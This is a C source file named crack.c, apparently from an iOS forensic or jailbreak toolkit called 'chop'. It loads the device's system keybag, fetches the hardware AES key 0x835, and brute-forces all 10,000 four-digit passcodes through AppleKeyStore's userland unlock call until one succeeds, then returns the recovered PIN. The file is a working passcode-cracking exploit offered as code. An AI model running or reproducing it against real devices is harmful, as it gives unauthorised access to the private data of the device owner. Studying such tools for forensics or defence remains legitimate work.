//
//  crack.c
//  chop
//
//  Created by Joshua Hill on 1/19/14.
//
//

#include <stdio.h>
#include <syslog.h>
#include <CoreFoundation/CoreFoundation.h>

#include "IOKit.h"
#include "AppleKeyStore.h"
#include "IOAESAccelerator.h"
#include "AppleEffaceableStorage.h"

#include "util.h"
#include "device_info.h"
#include "ioflash/ioflash.h"

int crack_pin(char** pin) {
    uint8_t* key835 = IOAES_key835();
    
    syslog(LOG_ERR, "Asking AppleKeyStore to load the system keybag");
    CFDictionaryRef kbdict = AppleKeyStore_loadKeyBag("/private/var/keybags","systembag");
    if (kbdict == NULL) {
        syslog(LOG_ERR, "FAILed to load keybag\n");
        return -1;
    }
    syslog(LOG_ERR, "Successfully loaded keybag\n");
    
    syslog(LOG_ERR, "Getting keys from system keybag");
    CFDataRef kbkeys = CFDictionaryGetValue(kbdict, CFSTR("KeyBagKeys"));
    CFRetain(kbkeys);
    if (kbkeys == NULL) {
        syslog(LOG_ERR, "FAIL: KeyBagKeys not found\n");
        return -1;
    }
    syslog(LOG_ERR, "Got keys from system keybag\n");
    
    syslog(LOG_ERR, "Asking AppleKeyStore to parse our keybag blobs");
    KeyBag* kb = AppleKeyStore_parseBinaryKeyBag(kbkeys);
    if (kb == NULL) {
        syslog(LOG_ERR, "FAIL: AppleKeyStore_parseBinaryKeyBag\n");
        return -1;
    }
    
    int i = 0;
    char* passcode = (char*) malloc(6);
    memset(passcode, 0, 6);
    
    if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, 4, key835)) {
        syslog(LOG_ERR, "No Passcode");
        *pin = NULL;
        return 0;
        
    } else {
        for(i=0; i < 10000; i++)  {
            sprintf(passcode, "%04d", i);
            if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, 4, key835)) {
                *pin = passcode;
                return 0;
            }
        }
    }
    
    //device_info(<#int socket#>, <#CFDictionaryRef request#>)
    
    return -1;
}